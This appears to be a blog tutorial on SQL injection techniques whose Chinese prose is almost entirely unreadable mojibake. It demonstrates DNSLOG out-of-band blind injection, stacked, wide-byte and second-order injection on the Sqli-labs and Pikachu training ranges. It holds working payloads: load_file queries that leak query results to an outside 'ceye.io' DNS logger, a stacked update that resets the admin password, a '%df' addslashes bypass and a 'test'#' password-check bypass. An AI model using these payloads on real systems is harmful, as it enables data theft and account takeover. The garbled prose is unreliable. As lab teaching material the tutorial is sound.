<p>DNSLOG ÊòØÂ≠òÂÇ®Âú® DNS ÊúçÂä°Âô®‰∏äÁöÑÂüüÂêç‰ø°ÊÅØÔºåÂÆÉËÆ∞ÂΩïÁùÄÁî®Êà∑ÂØπÂüüÂêçÁöÑËÆøÈóÆ‰ø°ÊÅØÔºåÁ±ª‰ººÊó•ÂøóÊñá‰ª∂„ÄÇÂÉèÊòØ SQL Áõ≤Ê≥®„ÄÅÂëΩ‰ª§ÊâßË°å„ÄÅSSRF Âèä XSS Á≠âÊîªÂáª‰ΩÜÊó†Ê≥ïÁúãÂà∞ÂõûÊòæÁªìÊûúÊó∂ÔºåÂ∞±‰ºöÁî®Âà∞ DNSLOG ÊäÄÊúØÔºåÁõ∏ÊØîÂ∏ÉÂ∞îÁõ≤Ê≥®ÂíåÊó∂Èó¥Áõ≤Ê≥®ÔºåDNSLOG ÂáèÂ∞ë‰∫ÜÂèëÈÄÅÁöÑËØ∑Ê±ÇÊï∞ÔºåÂèØ‰ª•Áõ¥Êé•ÂõûÊòæÔºå‰πüÂ∞±Èôç‰Ωé‰∫ÜË¢´ÂÆâÂÖ®ËÆæÂ§áÊã¶Êà™ÁöÑÂèØËÉΩÊÄß</p>
<p>DNSLOG Ê≥®ÂÖ•‰ºòÁÇπ‰ºóÂ§öÔºå‰ΩÜÂà©Áî®Êù°‰ª∂‰πüËæÉ‰∏∫‰∏•Ëãõ</p>
<ul>
<li>Âè™ÊîØÊåÅ Windows Á≥ªÁªüÁöÑÊúçÂä°Á´ØÔºåÂõ†‰∏∫Ë¶Å‰ΩøÁî® UNC Ë∑ØÂæÑËøô‰∏ÄÁâπÊÄßÔºåLinux ‰∏çÂÖ∑Â§áÊ≠§ÁâπÊÄß</li>
<li>Mysql ÊîØÊåÅ‰ΩøÁî®<code>load_file()</code>ÂáΩÊï∞ËØªÂèñ‰ªªÊÑèÁõòÁöÑÊñá‰ª∂</li>
</ul>
<h4 id="uncË∑ØÂæÑ"><a class="markdownIt-Anchor" href="#uncË∑ØÂæÑ"></a> UNCË∑ØÂæÑ</h4>
<p>UNC ÂÖ®Áß∞ Universal Naming ConventionÔºåËØë‰∏∫ÈÄöÁî®ÂëΩÂêçËßÑËåÉÔºå‰æãÂ¶ÇÊàë‰ª¨Âú®‰ΩøÁî®ËôöÊãüÊú∫ÁöÑÂÖ±‰∫´Êñá‰ª∂ÂäüËÉΩÊó∂Ôºå‰æø‰ºö‰ΩøÁî®Âà∞ UNC Ëøô‰∏ÄÁâπÊÄß</p>
<p>UNC Ë∑ØÂæÑÁöÑÊ†ºÂºèÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">\\192.168.0.1\test\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËøôÈáåÊàë‰ª¨‰ΩøÁî®ËøêË°å‰ΩøÁî® UNC Ë∑ØÂæÑËÆøÈóÆ<code>www.dnslog.cn</code>ÔºåÂπ∂‰ΩøÁî® wireshark ÊäìÂåÖÔºåÂèØ‰ª•ÁúãÂà∞Á°ÆÂÆûÂ≠òÂú®ÂØπ<code>www.dnslog.cn</code>Ëøô‰∏™ÂüüÂêçËøõË°å DNS ËØ∑Ê±ÇÁöÑÊµÅÈáèÔºå‰ΩÜÊòØÂπ∂‰∏ç‰ºöÂú®ÊµèËßàÂô®Áõ¥Êé•ÊâìÂºÄÁΩëÁ´ô</p>
<h4 id="load_file-ÂáΩÊï∞"><a class="markdownIt-Anchor" href="#load_file-ÂáΩÊï∞"></a> load_file() ÂáΩÊï∞</h4>
<p>‰∏äÊñáÊàë‰ª¨ÊèêÂà∞Ôºå<code>load_file()</code>ÂáΩÊï∞ÂèØ‰ª•ËØªÂèñ<strong>‰ªªÊÑè</strong>ÁõòÁöÑÊñá‰ª∂ÊâçÂèØ‰ª•‰ΩøÁî® DNSLOG Ê≥®ÂÖ•ÔºåÂÆÉÁöÑËØªÂèñËåÉÂõ¥Áî± Mysql ÈÖçÁΩÆÊñá‰ª∂<code>my.ini</code>‰∏≠ÁöÑ<code>secure_file_priv</code>ÂèÇÊï∞ÂÜ≥ÂÆö</p>
<ul>
<li>
<p>ÂΩì<code>secure_file_priv</code>‰∏∫Á©∫ÔºåÂ∞±ÂèØ‰ª•ËØªÂèñÁ£ÅÁõòÁöÑÁõÆÂΩï</p>
</li>
<li>
<p>ÂΩì<code>secure_file_priv</code>‰∏∫<code>G:\</code>ÔºåÂ∞±ÂèØ‰ª•ËØªÂèñGÁõòÁöÑÊñá‰ª∂</p>
</li>
<li>
<p>ÂΩì<code>secure_file_priv</code>‰∏∫ nullÔºå<code>load_file()</code>ÂáΩÊï∞Â∞±‰∏çËÉΩÂä†ËΩΩÊñá‰ª∂Ôºànull ÂíåÁ©∫ÊòØ‰∏§ÁßçÊÉÖÂÜµÔºâ</p>
</li>
</ul>
<h4 id="dnslog-Áõ≤Ê≥®ÂéüÁêÜ"><a class="markdownIt-Anchor" href="#dnslog-Áõ≤Ê≥®ÂéüÁêÜ"></a> DNSLOG Áõ≤Ê≥®ÂéüÁêÜ</h4>
<p>ÂÖàÁªôÂá∫ÊúÄÂ∏∏Áî®ÁöÑ‰∏§Áßç Payload</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">Payload 1:
and if((select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select ÊîªÂáªËØ≠Âè•),&#39;.xxxx.ceye.io&#x2F;sql_test&#39;))),1,0)

Payload 2:
and if((select load_file(concat(&#39;\\\\&#39;,(select ÊîªÂáªËØ≠Âè•),&#39;.xxxx.ceye.io\\sql_test&#39;))),1,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Payload 1,2 Â§ß‰ΩìÁöÑÊÄùË∑ØÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºå‰πüÂ∞±ÊòØÂú®<code>if()</code>ÂáΩÊï∞‰∏≠ÂµåÂ•ó<code>load_file()</code>ÂáΩÊï∞ÂÜç‰ΩøÁî® UNC Ë∑ØÂæÑËøõË°åËØªÂèñÔºå<code>sql_test</code>ËøôÈáåÂÜô‰ªÄ‰πàÈÉΩÂèØ‰ª•ÔºåÂè™ÊòØ‰∏∫‰∫ÜÁ¨¶Âêà<code>load_file()</code>ÂáΩÊï∞Ê†ºÂºèÔºåËØªÂèñÊó∂‰ºö‰∫ßÁîü DNS ËÆøÈóÆ‰ø°ÊÅØÔºåÂîØ‰∏ÄÁöÑ‰∏çÂêåÁÇπÂú®‰∫é Payload 2 Âú® URL ‰∏≠‰ΩøÁî®<code>\(ÂèçÊñúÊù†)</code>Êó∂Ë¶ÅÂèåÂÜôÈÖçÂêàËΩ¨‰πâ</p>
<blockquote>
<p>ËΩ¨‰πâÔºöËΩ¨‰πâÊòØ‰∏ÄÁßçÂºïÁî®Âçï‰∏™Â≠óÁ¨¶ÁöÑÊñπÊ≥ï. ‰∏Ä‰∏™ÂâçÈù¢Êîæ‰∏äËΩ¨‰πâÁ¨¶ ()ÁöÑÂ≠óÁ¨¶Â∞±ÊòØÂëäËØâ shell Ëøô‰∏™Â≠óÁ¨¶ÊåâÁÖßÂ≠óÈù¢ÁöÑÊÑèÊÄùËøõË°åËß£Èáä</p>
</blockquote>
<p>ËøôÈáå‰ΩøÁî® Pikachu Èù∂Âú∫ÁöÑÊó∂Èó¥Áõ≤Ê≥®ÂÖ≥Âç°ËøõË°åÊºîÁ§∫ÔºåÊñπ‰æøÂ§ßÂÆ∂ËøõË°åÁêÜËß£ÔºåÂú®ÊµãËØïÂâç‰∏ÄÂÆöÂÖàË¶ÅÁ°Æ‰øù<code>secure_file_priv</code>ÈÄâÈ°π‰∏∫Á©∫ÔºåÂèØ‰ª•‰ΩøÁî®<code>show variables like '%secure%';</code>ËøõË°åÊü•ËØ¢</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222000657.png" class="" alt="image-20240703222000657" loading="lazy">Âú®‰øÆÊîπ`my.ini`Êñá‰ª∂Êó∂ÈúÄË¶ÅÊ≥®ÊÑè`secure_file_priv`ÈÄâÈ°πÊòØÊñ∞Â¢ûÁöÑÔºåÊú¨Ë∫´Âπ∂Ê≤°ÊúâËøô‰∏™ÈÄâÈ°π
<p>ÈÄöËøáÂà§Êñ≠ÂèØ‰ª•ÂèëÁé∞ÊòØÂçïÂºïÂè∑Èó≠ÂêàÔºåÂÖàÁàÜÂá∫Â∫ìÂêçÔºåÂèØ‰ª•ÈÄöËøá DNSLOG Âπ≥Âè∞ÁúãÂà∞Â∫ìÂêç‰∏∫ pikachu</p>
<p>ËøôÈáåËøòÂèØ‰ª•‰ΩøÁî®<code>hex()</code>ÂáΩÊï∞ÔºåÂ∞ÜÂõûÊòæÂÜÖÂÆπÁºñÁ†Å‰∏∫ÂçÅÂÖ≠ËøõÂà∂ÔºåËøôÊ†∑ÂÅöÁöÑÂ•ΩÂ§ÑÊòØÔºåÂÅáËÆæÂõûÊòæÂÜÖÂÆπÂ≠òÂú®ÁâπÊÆäÂ≠óÁ¨¶<code>!@#$%^&amp;</code>ÔºåÂåÖÂê´ÁâπÊÆäÂ≠óÁ¨¶ÁöÑÂüüÂêçÊó†Ê≥ïË¢´Ëß£ÊûêÔºåDNSLOG‰πüÂ∞±Êó†Ê≥ïËÆ∞ÂΩï‰ø°ÊÅØÔºåËøõË°åÁºñÁ†ÅÂêéÂ∞±‰∏çÂ≠òÂú®Ëøô‰∏™ÈóÆÈ¢ò</p>
<h3 id="Â†ÜÂè†Ê≥®ÂÖ•"><a class="markdownIt-Anchor" href="#Â†ÜÂè†Ê≥®ÂÖ•"></a> Â†ÜÂè†Ê≥®ÂÖ•</h3>
<p>Â†ÜÂè†Ê≥®ÂÖ•ÁöÑÂü∫Êú¨ÂéüÁêÜÊòØÂú®‰∏ÄÊù° SQL ËØ≠Âè•ÁªìÊùüÂêéÔºàÈÄöÂ∏∏‰ΩøÁî®ÂàÜÂè∑<code>;</code>Ê†áËÆ∞ÁªìÊùüÔºâÔºåÁªßÁª≠ÊûÑÈÄ†Âπ∂ÊâßË°å‰∏ã‰∏ÄÊù°SQLËØ≠Âè•ÔºåËøôÁßçÊ≥®ÂÖ•ÊñπÊ≥ïÂèØ‰ª•ÊâßË°å‰ªªÊÑèÁ±ªÂûãÁöÑËØ≠Âè•ÔºåÂåÖÊã¨Êü•ËØ¢„ÄÅÊèíÂÖ•„ÄÅÊõ¥Êñ∞ÂíåÂà†Èô§Á≠âÁ≠â</p>
<p>‰∏éËÅîÂêàÊ≥®ÂÖ•Áõ∏ÊØîÔºå<strong>Â†ÜÂè†Ê≥®ÂÖ•ÊúÄÊòéÊòæÁöÑÂ∑ÆÂà´‰æøÊòØÂÆÉÁöÑÊùÉÈôêÊõ¥Â§ß‰∫Ü</strong>Ôºå‰æãÂ¶Ç‰ΩøÁî®ËÅîÂêàÊ≥®ÂÖ•Êó∂ÔºåÂêéÁ´Ø‰ΩøÁî®ÁöÑÊòØ select ËØ≠Âè•ÔºåÈÇ£‰πàÊàë‰ª¨Ê≥®ÂÖ•Êó∂‰πüÂè™ËÉΩÊâßË°å select Êìç‰ΩúÔºåËÄåÂ†ÜÂè†Êü•ËØ¢ÊòØ‰∏ÄÊù°Êñ∞ÁöÑ SQL ËØ≠Âè•Ôºå‰∏çÂèó‰∏ä‰∏ÄÂè•ÁöÑËØ≠Ê≥ïÈôêÂà∂ÔºåÊìç‰ΩúÁöÑÊùÉÈôê‰πüÂ∞±Êõ¥Â§ß‰∫Ü</p>
<p>‰ΩÜÁõ∏Â∫îÁöÑÔºåÂ†ÜÂè†Ê≥®ÂÖ•ÁöÑÂà©Áî®Êù°‰ª∂ÂèòÂæóÊõ¥Âä†‰∏•Ê†ºÔºå<mark>‰æãÂ¶ÇÂú® Mysql ‰∏≠ÔºåÈúÄË¶Å‰ΩøÁî®<code>mysqli_multi_query()</code>ÂáΩÊï∞ÊâçÂèØ‰ª•ËøõË°åÂ§öÊù° SQL ËØ≠Âè•ÂêåÊó∂ÊâßË°åÔºåÂêåÊó∂ËøòÈúÄË¶ÅÁΩëÁ´ôÂØπÂ†ÜÂè†Ê≥®ÂÖ•Êó†ËøáÊª§ÔºåÂõ†Ê≠§Âú®ÂÆûÊàò‰∏≠Â†ÜÂè†Ê≥®ÂÖ•ËøòÊòØËæÉ‰∏∫Â∞ëËßÅÁöÑ</mark></p>
<p>‰∏ãÈù¢Êàë‰ª¨Áî® Sqli-labs Á¨¨ 38 ÂÖ≥ËøõË°å‰∏Ä‰∏ãÊºîÁ§∫Êñπ‰æøÂ§ßÂÆ∂ÁêÜËß£ÔºåÂÖà‰ΩøÁî®ËÅîÂêàÊ≥®ÂÖ•Âà§Êñ≠Âá∫ÂàóÂêçÊúâ id„ÄÅusername„ÄÅpassword ‰∏âÈ°πÔºåÁÑ∂ÂêéÊàë‰ª¨‰ΩøÁî®Â†ÜÂè†Ê≥®ÂÖ•‰øÆÊîπ admin ÁöÑÂØÜÁ†ÅÔºàÂéüÂØÜÁ†Å‰∏∫ adminÔºâÔºå‰ΩøÁî® update ÊñπÊ≥ïÊûÑÈÄ† Payload Â¶Ç‰∏ã</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39;;update users set password&#x3D;&#39;test123456&#39; where username&#x3D;&#39;admin&#39;;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•"></a> ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•</h3>
<h4 id="‰ªÄ‰πàÊòØÂÆΩÂ≠óËäÇ"><a class="markdownIt-Anchor" href="#‰ªÄ‰πàÊòØÂÆΩÂ≠óËäÇ"></a> ‰ªÄ‰πàÊòØÂÆΩÂ≠óËäÇ</h4>
<p>ÂΩìÊüêÂ≠óÁ¨¶ÁöÑÂ§ßÂ∞è‰∏∫‰∏Ä‰∏™Â≠óËäÇÊó∂ÔºåÁß∞ÂÖ∂Â≠óÁ¨¶‰∏∫Á™ÑÂ≠óËäÇÔºåÂΩìÊüêÂ≠óÁ¨¶ÁöÑÂ§ßÂ∞è‰∏∫‰∏§‰∏™ÊàñÊõ¥Â§öÂ≠óËäÇÊó∂ÔºåÁß∞ÂÖ∂Â≠óÁ¨¶‰∏∫ÂÆΩÂ≠óËäÇÔºåËÄå‰∏î‰∏çÂêåÁöÑÂ≠óÁ¨¶ÁºñÁ†ÅÊñπÂºèÂíåÂ≠óÁ¨¶ÈõÜÂØπÂ≠óÁ¨¶ÁöÑÂ§ßÂ∞èÊúâ‰∏çÂêåÁöÑÂΩ±Âìç</p>
<p>‰æãÂ¶ÇÔºåÂú® ASCII Á†Å‰∏≠Ôºå‰∏Ä‰∏™Ëã±ÊñáÂ≠óÊØçÔºà‰∏çÂàÜÂ§ßÂ∞èÂÜôÔºâ‰∏∫‰∏Ä‰∏™Â≠óËäÇÔºå‰∏Ä‰∏™‰∏≠ÊñáÊ±âÂ≠ó‰∏∫‰∏§‰∏™Â≠óËäÇÔºõÂú® UTF-8 ÁºñÁ†Å‰∏≠Ôºå‰∏Ä‰∏™Ëã±ÊñáÂ≠ó‰∏∫‰∏Ä‰∏™Â≠óËäÇÔºå‰∏Ä‰∏™‰∏≠Êñá‰∏∫‰∏â‰∏™Â≠óËäÇÔºõÂú® Unicode ÁºñÁ†Å‰∏≠Ôºå‰∏Ä‰∏™Ëã±Êñá‰∏∫‰∏Ä‰∏™Â≠óËäÇÔºå‰∏Ä‰∏™‰∏≠Êñá‰∏∫‰∏§‰∏™Â≠óËäÇ</p>
<h4 id="ÊïèÊÑüÂáΩÊï∞"><a class="markdownIt-Anchor" href="#ÊïèÊÑüÂáΩÊï∞"></a> ÊïèÊÑüÂáΩÊï∞</h4>
<ul>
<li><code>addslashes()</code>ÂáΩÊï∞ÔºöËøîÂõûÂú®È¢ÑÂÆö‰πâÂ≠óÁ¨¶‰πãÂâçÊ∑ªÂä†ÂèçÊñúÊù†ÁöÑÂ≠óÁ¨¶‰∏≤</li>
<li><code>magic_quotes_gpc</code>ÈÄâÈ°πÔºöÂØπ POST„ÄÅGET„ÄÅCookie ‰º†ÂÖ•ÁöÑÊï∞ÊçÆËøõË°åËΩ¨‰πâÂ§ÑÁêÜÔºåÂú®ËæìÂÖ•Êï∞ÊçÆÁöÑÁâπÊÆäÂ≠óÁ¨¶Â¶Ç ÂçïÂºïÂè∑„ÄÅÂèåÂºïÂè∑„ÄÅÂèçÊñúÁ∫ø„ÄÅNULLÁ≠âÂ≠óÁ¨¶ÂâçÂä†ÂÖ•ËΩ¨‰πâÂ≠óÁ¨¶<code>\</code>ÔºåÂú®È´òÁâàÊú¨ PHP ‰∏≠Ôºà&gt;=5.4.0ÔºâÂ∑≤ÁªèÂºÉÁî®</li>
<li><code>mysql_real_escape_string()</code>ÂáΩÊï∞ÔºöÂáΩÊï∞ËΩ¨‰πâ SQL ËØ≠Âè•‰∏≠‰ΩøÁî®ÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÁâπÊÆäÂ≠óÁ¨¶</li>
<li><code>mysql_escape_string()</code>ÂáΩÊï∞ÔºöÂíå<code>mysql_real_escape_string()</code>ÂáΩÊï∞Âü∫Êú¨‰∏ÄËá¥ÔºåÂ∑ÆÂà´Âú®‰∫é‰∏çÊé•ÂèóËøûÊé•ÂèÇÊï∞Ôºå‰πü‰∏çÁÆ°ÂΩìÂâçÂ≠óÁ¨¶ÈõÜËÆæÂÆö</li>
</ul>
<h4 id="ÂéüÁêÜ-3"><a class="markdownIt-Anchor" href="#ÂéüÁêÜ-3"></a> ÂéüÁêÜ</h4>
<p>ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®ÊòØÂºÄÂèëËÄÖËÆæÁΩÆ<strong>Êï∞ÊçÆÂ∫ìÁºñÁ†Å‰∏é PHP ÁºñÁ†Å‰∏∫‰∏çÂêåÁöÑÁºñÁ†ÅÊ†ºÂºè‰ªéËÄåÂØºËá¥‰∫ßÁîüÂÆΩÂ≠óËäÇÊ≥®ÂÖ•</strong>Ôºå‰æãÂ¶ÇÂΩì Mysql Êï∞ÊçÆÂ∫ì‰ΩøÁî® GBK ÁºñÁ†ÅÊó∂ÔºåÂÆÉ‰ºöÊää‰∏§‰∏™Â≠óËäÇÁöÑÂ≠óÁ¨¶Ëß£Êûê‰∏∫‰∏Ä‰∏™Ê±âÂ≠óÔºåËÄå‰∏çÊòØ‰∏§‰∏™Ëã±ÊñáÂ≠óÁ¨¶ÔºåËøôÊ†∑ÔºåÂ¶ÇÊûúÊàë‰ª¨ËæìÂÖ•‰∏Ä‰∫õÁâπÊÆäÁöÑÂ≠óÁ¨¶ÔºåÂ∞±‰ºöÂΩ¢Êàê SQL Ê≥®ÂÖ•</p>
<p>‰∏∫‰∫ÜÈò≤Ê≠¢ SQL Ê≥®ÂÖ•ÔºåÈÄöÂ∏∏‰ºö‰ΩøÁî®‰∏Ä‰∫õ PHP ÂáΩÊï∞ÔºåÂ¶Ç<code>addslashes()</code>ÂáΩÊï∞ÔºåÊù•ÂØπÁâπÊÆäÂ≠óÁ¨¶ËøõË°åËΩ¨‰πâÔºàÊàë‰ª¨‰πãÂâçËØ¥ËøáÔºåËΩ¨‰πâÂ∞±ÊòØÂú®Â≠óÁ¨¶ÂâçÂä†‰∏Ä‰∏™<code>\</code>ÔºâÔºåÂèçÊñúÊù†Áî® URL ÁºñÁ†ÅË°®Á§∫ÊòØ<code>%5c</code>ÔºåÊâÄ‰ª•Â¶ÇÊûúÊàë‰ª¨ËæìÂÖ•ÂçïÂºïÂè∑<code>‚Äô</code>ÔºåÂÆÉ‰ºöÂèòÊàê<code>%5c%27</code>ÔºåËøôÊ†∑Êàë‰ª¨Â∞±Êó†Ê≥ïÈó≠Âêà SQL ËØ≠Âè•‰∫Ü</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222526003.png" class="" alt="image-20240703222526003" loading="lazy">
<p>‰ΩÜÊòØÔºåÂ¶ÇÊûúÊàë‰ª¨ËæìÂÖ•<code>%df‚Äô</code>ÔºåÂÆÉ‰ºöÂèòÊàê<code>%df%5c%27</code>ÔºåËøôÈáåÔºå%df%5cÊòØ‰∏Ä‰∏™ÂÆΩÂ≠óËäÇÁöÑGBKÁºñÁ†ÅÔºåÂÆÉË°®Á§∫‰∏Ä‰∏™ÁπÅ‰ΩìÂ≠ó‚ÄúÈÅã‚Äù</p>
<p>Âõ†‰∏∫ GBK ÁºñÁ†ÅÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇÁöÑËåÉÂõ¥ÊòØ 129-254ÔºåËÄå<code>%df</code>ÁöÑÂçÅËøõÂà∂ÊòØ 223ÔºåÊâÄ‰ª•ÂÆÉÂ±û‰∫é GBK ÁºñÁ†ÅÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇÔºåËÄå<code>%5c</code>ÁöÑÂçÅËøõÂà∂ÊòØ 92ÔºåÂÆÉÂ±û‰∫é GBK ÁºñÁ†ÅÁöÑÁ¨¨‰∫å‰∏™Â≠óËäÇÁöÑËåÉÂõ¥ 64-254ÔºåÊâÄ‰ª•Ôºå<code>%df%5c</code>Ë¢´Êï∞ÊçÆÂ∫ìËß£Êûê‰∏∫‰∏Ä‰∏™Ê±âÂ≠óÔºåËÄå‰∏çÊòØ‰∏§‰∏™Ëã±ÊñáÂ≠óÁ¨¶</p>
<p>ËøôÈáåÊàë‰ª¨Áî® Sqli-Labs Á¨¨ 32 ÂÖ≥ËøõË°åÊºîÁ§∫Êñπ‰æøÂ§ßÂÆ∂ÁêÜËß£ÔºåÊ†áÈ¢ò‰∏∫ Bypass addslashes()Ôºå‰πüÂ∞±ÊòØËØ¥‰ΩøÁî®‰∫Ü<code>addslashes()</code>ÂáΩÊï∞ÔºåÂÖà‰ΩøÁî®ÂçïÂºïÂè∑Âà§Êñ≠Èó≠ÂêàÔºåÂèëÁé∞ÂçïÂºïÂè∑Ë¢´ËΩ¨‰πâ</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222607243.png" class="" alt="image-20240703222607243" loading="lazy">
<p>ËøôÈáåÊàë‰ª¨ÁôΩÁõíÂÆ°ËÆ°ÂèëÁé∞ÁºñÁ†ÅÁ±ªÂûã‰∏∫ GBK</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql_query(&quot;SET NAMES gbk&quot;);
$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;
$result&#x3D;mysql_query($sql);
$row &#x3D; mysql_fetch_array($result);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>Âõ∫ÈááÁî®ÂÆΩÂ≠óËäÇÁªïËøá</p>
<p>ÊûÑÈÄ†payload<code>?id=1%df</code>ËøôÈáåÂêéÈù¢ÂÜçÂä†‰∏™ÂçïÂºïÂè∑‰πüÊó†Ê≥ïÈó≠ÂêàÔºåÂõ†‰∏∫‰ºöÂÜçÊ¨°Ëß¶ÂèëËΩ¨‰πâÊú∫Âà∂ÔºåËøôÈáåÁõ¥Êé•Ê≥®ÈáäÊéâÂêéÈù¢ÁöÑÂÜÖÂÆπÔºåÂ∞±ÂΩ¢Êàê‰∫ÜÊ°ÜÊû∂Ôºå‰∏éËÅîÂêàÊ≥®ÂÖ•Â∞±‰∏ÄÊ†∑‰∫Ü</p>
<h3 id="‰∫åÊ¨°Ê≥®ÂÖ•"><a class="markdownIt-Anchor" href="#‰∫åÊ¨°Ê≥®ÂÖ•"></a> ‰∫åÊ¨°Ê≥®ÂÖ•</h3>
<h4 id="ÂéüÁêÜ-4"><a class="markdownIt-Anchor" href="#ÂéüÁêÜ-4"></a> ÂéüÁêÜ</h4>
<p>ËøôÈáåÂÅáËÆæÊúâ A Âíå B ‰∏§‰∏™Ê≥®ÂÖ•ÁÇπÔºå<strong>A Ê≥®ÂÖ•ÁÇπÂõ†‰∏∫Â≠òÂú®ËøáÊª§Â§ÑÁêÜÊâÄ‰ª•Êó†Ê≥ïÁõ¥Êé•ËøõË°åÊ≥®ÂÖ•Ôºå‰ΩÜÊòØ‰ºöÂ∞ÜÊàë‰ª¨ËæìÂÖ•ÁöÑÊï∞ÊçÆ‰ª•ÂéüÊú¨ÁöÑÂΩ¢ÂºèÂÇ®Â≠òÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÔºàÂ≠òÂÖ•Êï∞ÊçÆÂ∫ìÊó∂Ë¢´ËøòÂéü‰∫ÜÔºâÔºåÂú®Ê≠§ÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÊâæÂà∞Ê≥®ÂÖ•ÁÇπ BÔºå‰ΩøÂæóÂêéÁ´ØË∞ÉÁî®Â≠òÂÇ®Âú®Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊÅ∂ÊÑèÊï∞ÊçÆÂπ∂ÊâßË°å SQL Êü•ËØ¢</strong>ÔºåÂÆåÊàê‰∫åÊ¨°Ê≥®ÂÖ•</p>
<p>Ëøô‰πüÂ∞±ÂºïÂá∫‰∫Ü‰∫åÊ¨°Ê≥®ÂÖ•ÁöÑ‰∏§‰∏™Ê≠•È™§</p>
<ul>
<li>ÊèíÂÖ•ÊÅ∂ÊÑèÊï∞ÊçÆÔºöÊûÑÈÄ†ÊÅ∂ÊÑèËØ≠Âè•Âπ∂ËøõË°åÊï∞ÊçÆÂ∫ìÊèíÂÖ•Êï∞ÊçÆÊó∂ÔºåËôΩÂØπÂÖ∂‰∏≠ÁâπÊÆäÂ≠óÁ¨¶ËøõË°å‰∫ÜËΩ¨‰πâÂ§ÑÁêÜÔºå‰ΩÜÂú®ÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÊó∂‰ªç‰øùÁïô‰∫ÜÂéüÊù•ÁöÑÊï∞ÊçÆ</li>
<li>Ë∞ÉÁî®ÊÅ∂ÊÑèÊï∞ÊçÆÔºöÂºÄÂèëËÄÖÈªòËÆ§Â≠òÂÖ•Êï∞ÊçÆÂ∫ìÁöÑÊï∞ÊçÆÈÉΩÊòØÂÆâÂÖ®ÁöÑÔºåÂú®ËøõË°åË∞ÉÁî®Êó∂ÔºåÁõ¥Êé•‰ΩøÁî®ÊÅ∂ÊÑèÊï∞ÊçÆÔºåÊ≤°ÊúâËøõË°å‰∫åÊ¨°Ê†°È™å</li>
</ul>
<p>ËøôÈáåÊàë‰ª¨Áî® Sqli-Labs Á¨¨ 24 ÂÖ≥ËøõË°åÊºîÁ§∫Êñπ‰æøÂ§ßÂÆ∂ÁêÜËß£ÔºåÊâìÂºÄÈù∂Âú∫ÂèØ‰ª•ÁúãÂà∞ÊòØ‰∏Ä‰∏™ÁôªÂΩï/Ê≥®ÂÜåÈ°µÈù¢</p>
<p>ËøôÈáåÊàë‰ª¨ÂÖàÂØπÊ≥®ÂÜåÈ°µÈù¢ËøõË°åÁôΩÁõíÂÆ°ËÆ°ÔºåÂèëÁé∞‰ΩøÁî®<code>mysql_escape_string()</code>ÂáΩÊï∞ËøõË°åËΩ¨‰πâ</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">$username&#x3D;  mysql_escape_string($_POST[&#39;username&#39;]) ;
  $pass&#x3D; mysql_escape_string($_POST[&#39;password&#39;]);
  $re_pass&#x3D; mysql_escape_string($_POST[&#39;re_password&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Êàë‰ª¨ÂÖàÊù•Ê≥®ÂÜå‰∏Ä‰∏™ test Ë¥¶Âè∑Áúã‰∏Ä‰∏ã‰∏öÂä°ÈÄªËæëÔºåÂèëÁé∞ÁôªÂÖ•ÂêéÂè∞ÂêéÂèØ‰ª•‰øÆÊîπÂØÜÁ†ÅÔºåÂÜçÊù•ÁôΩÁõíÁúã‰∏Ä‰∏ã‰øÆÊîπÂØÜÁ†ÅÁöÑ SQL ËØ≠Âè•</p>
<pre class="line-numbers language-none"><code class="language-none">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Âõ∫Êàë‰ª¨ÂèØ‰ª•Âú®Áî®Êà∑ÂêçÂ§ÑÊûÑÈÄ† Payload ‰∏∫<code>test'#</code>ÔºåÊèêÂâçÈó≠Âêà username ÂèÇÊï∞Ôºå‰æøÊúâ‰∫ÜË¶ÜÁõñÂÖ∂‰ªñË¥¶Êà∑ÂØÜÁ†ÅÁöÑÂèØËÉΩÊÄßÔºå<code>$curr_pass</code>ÂèòÈáèÊòØÂéüÂØÜÁ†ÅÔºåÊâÄ‰ª•ËøôÈáåË¢´Ê≥®Èáä‰∏çÂΩ±ÂìçÂØÜÁ†ÅÁöÑ‰øÆÊîπÔºåÂèçËÄåÂéªÈô§‰∫ÜÂéüÂØÜÁ†ÅÁöÑÊ†°È™å</p>
<pre class="line-numbers language-none"><code class="language-none">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;test&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
